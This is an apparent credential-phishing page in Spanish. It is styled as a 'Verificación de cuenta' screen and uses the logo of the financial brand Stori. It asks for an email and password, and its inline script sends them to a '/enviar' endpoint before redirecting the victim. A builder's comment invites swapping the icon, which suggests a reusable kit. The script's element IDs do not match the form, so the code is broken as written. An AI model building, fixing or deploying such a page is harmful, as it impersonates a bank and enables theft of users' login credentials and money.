<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Verificación de cuenta</title>
  <link rel="stylesheet" href="style.css">
  <style>
    body {
      background-color: #f3f6fb;
      font-family: Arial, sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }
    .container {
      background: #fff;
      border-radius: 15px;
      padding: 40px 30px;
      width: 100%;
      max-width: 400px;
      box-shadow: 0 0 20px rgba(0,0,0,0.1);
      text-align: center;
    }
    .logo {
      margin-bottom: 30px;
    }
    .logo img {
      height: 50px;
    }
    h2 {
      font-size: 1.5em;
      margin-bottom: 10px;
    }
    p {
      color: #777;
      font-size: 0.95em;
      margin-bottom: 20px;
    }
    input {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 8px;
      font-size: 1em;
    }
    button {
      background-color: #00b075;
      color: white;
      padding: 12px;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      font-size: 1em;
      width: 100%;
    }
    button:hover {
      background-color: #019765;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">
      <!-- Puedes cambiar este ícono si quieres -->
      <img src="https://stori.card/img/logo.svg" alt="logo" />
    </div>
    <h2>Verificación de cuenta</h2>
    <p>Ingrese su correo y contraseña para continuar</p>
    <form id="loginForm">
      <input type="email" id="email" name="email" placeholder="Correo electrónico" required />
      <input type="password" id="password" name="password" placeholder="Contraseña" required />
      <button type="submit">Continuar</button>
    </form>
  </div>

<!-- ... todo tu HTML ... -->

<script>
  window.addEventListener('DOMContentLoaded', () => {
    document.getElementById('login-form').addEventListener('submit', function (e) {
      e.preventDefault();
      const usuario = document.getElementById('usuario').value;
      const clave = document.getElementById('clave').value;

      fetch('/enviar', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ usuario, clave })
      })
      .then(res => {
        if (res.ok) {
          window.location.href = 'opciones.html'; // redirige si todo sale bien
        } else {
          alert('Error al enviar datos');
        }
      });
    });
  });
</script>

<script src="main.js"></script>
</body>
</html>
